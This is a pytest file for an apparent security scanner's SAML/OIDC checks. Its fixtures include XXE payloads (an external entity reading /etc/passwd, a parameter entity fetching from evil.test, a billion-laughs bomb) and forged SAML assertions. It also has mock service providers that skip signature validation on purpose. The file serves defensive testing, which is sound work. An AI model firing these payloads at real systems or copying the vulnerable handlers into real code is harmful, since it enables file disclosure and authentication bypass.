"""
SSO / SAML / OIDC checks (scanner.sso).

Covers the four confirmable checks end-to-end through the real ``AuditEngine`` +
oracle path (a forged/tampered/wrapped artifact ACCEPTED fires the achieved-state
oracle; a hardened endpoint does NOT), the XXE-safe XML parser (a malicious-entity
document never resolves), the pure SAML/OIDC helpers, the LEAD analysers, and the
opt-in invariants (the checks are NOT in the default roster; the bug classes route
to ACHIEVED_STATE).

Transport is an injected ``send`` (the engine's boundary), so the tests are
deterministic and socket-free while exercising the exact production confirm path.
"""

from __future__ import annotations

import base64
from urllib.parse import parse_qsl, quote, urlsplit

import pytest

from framework.v2.scanner import jwt as _jwt
from framework.v2.scanner import sso
from framework.v2.scanner.campaign import DEFAULT_REQUEST_CHECKS, WebScanCampaign
from framework.v2.scanner.engine import AuditEngine
from framework.v2.scanner.insertion import HttpRequest
from framework.v2.verify.models import OracleKind
from framework.v2.verify.verifier import OracleVerifier, is_known_bug_class, normalize_bug_class

_NS_P = "urn:oasis:names:tc:SAML:2.0:protocol"
_NS_A = "urn:oasis:names:tc:SAML:2.0:assertion"
_NS_D = "http://www.w3.org/2000/09/xmldsig#"

# A signed SAML Response. The <ds:SignatureValue> text stands in for "the content
# the signature cryptographically commits to" (the NameID) — a hardened SP accepts
# only when the consumed assertion's NameID equals it, which is what makes a
# tampered/wrapped assertion detectable without a real XML-DSig implementation.
_SIGNED_SAML = (
    f'<samlp:Response xmlns:samlp="{_NS_P}" xmlns:saml="{_NS_A}" xmlns:ds="{_NS_D}" '
    'ID="R1" Version="2.0">'
    "<saml:Issuer>https://idp.example.test</saml:Issuer>"
    '<samlp:Status><samlp:StatusCode '
    'Value="urn:oasis:names:tc:SAML:2.0:status:Success"/></samlp:Status>'
    '<saml:Assertion ID="A1" Version="2.0">'
    "<saml:Issuer>https://idp.example.test</saml:Issuer>"
    "<ds:Signature><ds:SignatureValue>alice@example.test</ds:SignatureValue></ds:Signature>"
    "<saml:Subject><saml:NameID>alice@example.test</saml:NameID></saml:Subject>"
    '<saml:Conditions NotOnOrAfter="2035-01-01T00:00:00Z"/>'
    "</saml:Assertion></samlp:Response>"
)


def _b64(x: str) -> str:
    return base64.b64encode(x.encode()).decode()


def _confirmed(engine_findings, bug_class: str) -> bool:
    return any(f.bug_class == bug_class and f.confirmed_by == "achieved_state"
               for f in engine_findings)


# ---------------------------------------------------------------------------
# XXE safety — the untrusted-XML boundary must never resolve an entity
# ---------------------------------------------------------------------------

_BILLION_LAUGHS = (
    '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol">'
    '<!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;">]><lolz>&lol2;</lolz>'
)
_EXTERNAL_ENTITY = (
    '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
    "<r>&xxe;</r>"
)
_PARAM_ENTITY = (
    '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % p SYSTEM "http://evil.test/x">%p;]><r/>'
)


@pytest.mark.parametrize("doc", [_BILLION_LAUGHS, _EXTERNAL_ENTITY, _PARAM_ENTITY])
def test_safe_parse_rejects_dtd_and_entities(doc: str) -> None:
    with pytest.raises(sso.XxeBlocked):
        sso.safe_parse_xml(doc)


def test_external_entity_never_resolves_to_file_content() -> None:
    # The definitive XXE property: even attempting to parse the external-entity
    # document yields no file content — it is refused before any resolution.
    try:
        root = sso.safe_parse_xml(_EXTERNAL_ENTITY)
        text = "".join(root.itertext())
    except sso.XxeBlocked:
        text = ""
    assert "root:" not in text and "/bin/" not in text


def test_safe_parse_bounds_size() -> None:
    with pytest.raises(sso.XxeBlocked):
        sso.safe_parse_xml("<r>" + "a" * 100 + "</r>", max_bytes=16)


def test_safe_parse_accepts_benign_saml() -> None:
    root = sso.safe_parse_xml(_SIGNED_SAML)
    assert sso.saml_nameid(root) == "alice@example.test"


# ---------------------------------------------------------------------------
# Pure SAML helpers
# ---------------------------------------------------------------------------


def test_saml_codec_roundtrip() -> None:
    assert sso.decode_saml(sso.encode_saml(_SIGNED_SAML)) == _SIGNED_SAML
    # bad base64 -> None (never raises), so a check bails cleanly rather than erroring
    assert sso.decode_saml("!!!not base64!!!") is None
    assert sso.decode_saml("") == ""


def test_tamper_assertion_rewrites_nameid_only() -> None:
    tampered = sso.tamper_assertion(_SIGNED_SAML, "attacker@evil.test")
    root = sso.safe_parse_xml(tampered)
    assert sso.saml_nameid(root) == "attacker@evil.test"
    # signature left untouched (so it no longer matches the content)
    assert "alice@example.test" in tampered  # the original SignatureValue survives


def test_wrap_assertion_xsw_inserts_forged_before_original() -> None:
    wrapped = sso.wrap_assertion_xsw(_SIGNED_SAML, "attacker@evil.test")
    root = sso.safe_parse_xml(wrapped)
    assertions = list(root.iter(f"{{{_NS_A}}}Assertion"))
    assert len(assertions) == 2
    # forged assertion is first, unsigned, and carries the attacker identity
    first = assertions[0]
    assert first.get("ID") == "_crucible_xsw_forged"
    assert not list(first.iter(f"{{{_NS_D}}}Signature"))
    first_nid = first.find(f".//{{{_NS_A}}}NameID")
    assert first_nid is not None and first_nid.text == "attacker@evil.test"
    # original signed assertion survives intact (signature + legit identity)
    assert list(assertions[1].iter(f"{{{_NS_D}}}Signature"))


def test_tamper_and_wrap_reject_malicious_entities() -> None:
    with pytest.raises(sso.XxeBlocked):
        sso.tamper_assertion(_EXTERNAL_ENTITY, "x")
    with pytest.raises(sso.XxeBlocked):
        sso.wrap_assertion_xsw(_BILLION_LAUGHS, "x")


# ---------------------------------------------------------------------------
# SAML checks — modelled SPs via an injected send, driven through AuditEngine
# ---------------------------------------------------------------------------


def _acs_request() -> HttpRequest:
    body = "SAMLResponse=" + quote(_b64(_SIGNED_SAML)) + "&RelayState=/app"
    return HttpRequest(
        method="POST", url="https://sp.example.test/acs",
        headers=[("Content-Type", "application/x-www-form-urlencoded")], body=body)


def _vuln_sp(req: HttpRequest) -> dict:
    """Vulnerable SP: never validates the signature; reads the FIRST assertion's
    NameID and logs that identity in, reflecting it."""
    xml = sso.decode_saml(sso.extract_form_field(req, "SAMLResponse") or "")
    try:
        root = sso.safe_parse_xml(xml or "")
    except sso.XxeBlocked:
        return {"status": 400, "body": "rejected"}
    assertions = list(root.iter(f"{{{_NS_A}}}Assertion"))
    if not assertions:
        return {"status": 403, "body": "no assertion"}
    nid = assertions[0].find(f".//{{{_NS_A}}}NameID")
    if nid is None or not nid.text:
        return {"status": 403, "body": "no identity"}
    return {"status": 200, "body": f"<html>Welcome {nid.text}</html>"}


def _hardened_sp(req: HttpRequest) -> dict:
    """Hardened SP: consumes ONLY an assertion whose signature covers its NameID
    (SignatureValue text == NameID text), i.e. XSW/tampering-resistant."""
    xml = sso.decode_saml(sso.extract_form_field(req, "SAMLResponse") or "")
    root = sso.safe_parse_xml(xml or "")
    for a in root.iter(f"{{{_NS_A}}}Assertion"):
        sig = a.find(f"{{{_NS_D}}}Signature/{{{_NS_D}}}SignatureValue")
        if sig is not None:
            nid = a.find(f".//{{{_NS_A}}}NameID")
            if nid is not None and nid.text == (sig.text or ""):
                return {"status": 200, "body": f"<html>Welcome {nid.text}</html>"}
            return {"status": 403, "body": "signature mismatch"}
    return {"status": 403, "body": "no signed assertion"}


def _audit(send, check) -> list:
    return AuditEngine(send).audit(_acs_request(), checks=(), request_checks=(check,))


def test_saml_tampering_confirmed_on_vulnerable_sp() -> None:
    findings = _audit(_vuln_sp, sso.SamlAssertionTamperingCheck())
    assert _confirmed(findings, "saml_assertion_tampering")


def test_saml_tampering_not_flagged_on_hardened_sp() -> None:
    assert _audit(_hardened_sp, sso.SamlAssertionTamperingCheck()) == []


def test_saml_xsw_confirmed_on_vulnerable_sp() -> None:
    findings = _audit(_vuln_sp, sso.SamlSignatureWrappingCheck())
    assert _confirmed(findings, "saml_signature_wrapping")


def test_saml_xsw_not_flagged_on_hardened_sp() -> None:
    # The hardened SP accepts the XSW message but as the LEGIT signed identity —
    # a status-only check would false-positive here; requiring the forged marker
    # in the response keeps it clean.
    assert _audit(_hardened_sp, sso.SamlSignatureWrappingCheck()) == []


def test_saml_checks_inert_without_a_samlresponse() -> None:
    plain = HttpRequest(method="GET", url="https://sp.example.test/", headers=[])
    calls = []

    def counting_send(req: HttpRequest) -> dict:
        calls.append(req)
        return {"status": 200, "body": "ok"}

    out = AuditEngine(counting_send).audit(
        plain, checks=(),
        request_checks=(sso.SamlSignatureWrappingCheck(), sso.SamlAssertionTamperingCheck()))
    assert out == [] and calls == []  # no artifact -> no traffic, no finding


# ---------------------------------------------------------------------------
# OIDC redirect_uri validation
# ---------------------------------------------------------------------------


def _authorize_request() -> HttpRequest:
    return HttpRequest(
        method="GET",
        url=("https://op.example.test/authorize?response_type=code&client_id=abc"
             "&redirect_uri=" + quote("https://app.example.test/cb") + "&scope=openid&state=s"),
        headers=[])


def _redirect_uri_of(req: HttpRequest) -> str:
    return dict(parse_qsl(urlsplit(req.url).query)).get("redirect_uri", "")


def _vuln_authz(req: HttpRequest) -> dict:
    ru = _redirect_uri_of(req)
    return {"status": 302, "headers": [("Location", f"{ru}?code=SECRETCODE")], "body": ""}


def _hardened_authz(req: HttpRequest) -> dict:
    ru = _redirect_uri_of(req)
    if ru == "https://app.example.test/cb":
        return {"status": 302, "headers": [("Location", f"{ru}?code=SECRETCODE")], "body": ""}
    return {"status": 400, "headers": [], "body": "unregistered redirect_uri"}


def test_oidc_redirect_uri_confirmed_when_it_redirects_to_attacker() -> None:
    findings = AuditEngine(_vuln_authz).audit(
        _authorize_request(), checks=(), request_checks=(sso.OidcRedirectUriCheck(),))
    assert _confirmed(findings, "oidc_redirect_uri")


def test_oidc_redirect_uri_not_flagged_when_validated() -> None:
    findings = AuditEngine(_hardened_authz).audit(
        _authorize_request(), checks=(), request_checks=(sso.OidcRedirectUriCheck(),))
    assert findings == []


# ---------------------------------------------------------------------------
# OIDC id_token forgery (alg:none) at the operator's RP callback
# ---------------------------------------------------------------------------

_IDP_SECRET = b"idp-signing-secret"


def _idtoken_request() -> HttpRequest:
    tok = _jwt.encode_hs256({"typ": "JWT"}, {"sub": "alice", "email": "alice@example.test"}, _IDP_SECRET)
    return HttpRequest(
        method="POST", url="https://rp.example.test/callback",
        headers=[("Content-Type", "application/x-www-form-urlencoded")],
        body="id_token=" + quote(tok))


def _vuln_rp(req: HttpRequest) -> dict:
    tok = sso.extract_form_field(req, "id_token") or ""
    if not _jwt._looks_like_jwt(tok):
        return {"status": 401, "body": "bad token"}
    try:
        _h, p, _ = _jwt.decode(tok)
    except Exception:
        return {"status": 401, "body": "undecodable"}
    return {"status": 200, "body": f"session for {p.get('sub')}"}  # trusts unsigned!


def _hardened_rp(req: HttpRequest) -> dict:
    tok = sso.extract_form_field(req, "id_token") or ""
    try:
        h, p, _ = _jwt.decode(tok)
    except Exception:
        return {"status": 401, "body": "undecodable"}
    if h.get("alg") != "HS256" or _jwt.encode_hs256(h, p, _IDP_SECRET) != tok:
        return {"status": 401, "body": "signature invalid"}
    return {"status": 200, "body": f"session for {p.get('sub')}"}


def test_oidc_idtoken_forgery_confirmed_on_vulnerable_rp() -> None:
    findings = AuditEngine(_vuln_rp).audit(
        _idtoken_request(), checks=(), request_checks=(sso.OidcIdTokenCheck(),))
    assert _confirmed(findings, "oidc_idtoken_forgery")


def test_oidc_idtoken_forgery_not_flagged_on_hardened_rp() -> None:
    findings = AuditEngine(_hardened_rp).audit(
        _idtoken_request(), checks=(), request_checks=(sso.OidcIdTokenCheck(),))
    assert findings == []


# ---------------------------------------------------------------------------
# LEADs — config observations, never confirmed findings
# ---------------------------------------------------------------------------


def test_analyze_authorize_request_flags_missing_state_and_nonce() -> None:
    kinds = {l.kind for l in sso.analyze_authorize_request(
        "https://op/authorize?response_type=id_token+token&client_id=x&scope=openid")}
    assert {"oidc_missing_state", "oidc_missing_nonce", "oidc_front_channel_tokens"} <= kinds
    # a clean code-flow request with state present yields no missing-state lead
    clean = sso.analyze_authorize_request(
        "https://op/authorize?response_type=code&client_id=x&scope=openid&state=abc")
    assert clean == []
    # a non-authorize URL yields nothing
    assert sso.analyze_authorize_request("https://x/page?q=1") == []


def test_analyze_saml_response_flags_unsigned_and_no_conditions() -> None:
    unsigned = (f'<samlp:Response xmlns:samlp="{_NS_P}" xmlns:saml="{_NS_A}">'
                "<saml:Assertion><saml:Subject><saml:NameID>u</saml:NameID></saml:Subject>"
                "</saml:Assertion></samlp:Response>")
    kinds = {l.kind for l in sso.analyze_saml_response(unsigned)}
    assert {"saml_unsigned", "saml_no_conditions"} <= kinds
    # the signed, well-formed fixture yields neither
    assert sso.analyze_saml_response(_SIGNED_SAML) == []
    # a malicious-entity document yields no leads (refused, never resolved)
    assert sso.analyze_saml_response(_EXTERNAL_ENTITY) == []


# ---------------------------------------------------------------------------
# Opt-in / vocabulary invariants
# ---------------------------------------------------------------------------


def test_sso_checks_are_not_in_the_default_roster() -> None:
    default_ids = {getattr(c, "id", None) for c in DEFAULT_REQUEST_CHECKS}
    sso_ids = {c.id for c in sso.SSO_REQUEST_CHECKS}
    assert sso_ids.isdisjoint(default_ids)
    # 4 live acceptance checks + the offline structural-forgery producer (T4b)
    assert len(sso.SSO_REQUEST_CHECKS) == 5
    assert "saml-structural-forgery" in sso_ids


def test_campaign_enable_sso_wires_the_checks_only_when_on() -> None:
    off = WebScanCampaign(lambda r: {"status": 200, "body": ""})
    on = WebScanCampaign(lambda r: {"status": 200, "body": ""}, enable_sso=True)
    assert off._sso_request_checks == ()
    assert tuple(c.id for c in on._sso_request_checks) == tuple(c.id for c in sso.SSO_REQUEST_CHECKS)


def test_sso_bug_classes_are_known_and_route_to_achieved_state() -> None:
    for bc in ("saml_signature_wrapping", "saml_assertion_tampering",
               "oidc_redirect_uri", "oidc_idtoken_forgery"):
        assert is_known_bug_class(bc)
        assert OracleVerifier().oracles_for(bc) == (OracleKind.ACHIEVED_STATE,)
    # honest spelling aliases fold onto the canonical classes
    assert normalize_bug_class("XSW") == "saml_signature_wrapping"
    assert normalize_bug_class("saml-tampering") == "saml_assertion_tampering"
    assert normalize_bug_class("id_token_forgery") == "oidc_idtoken_forgery"
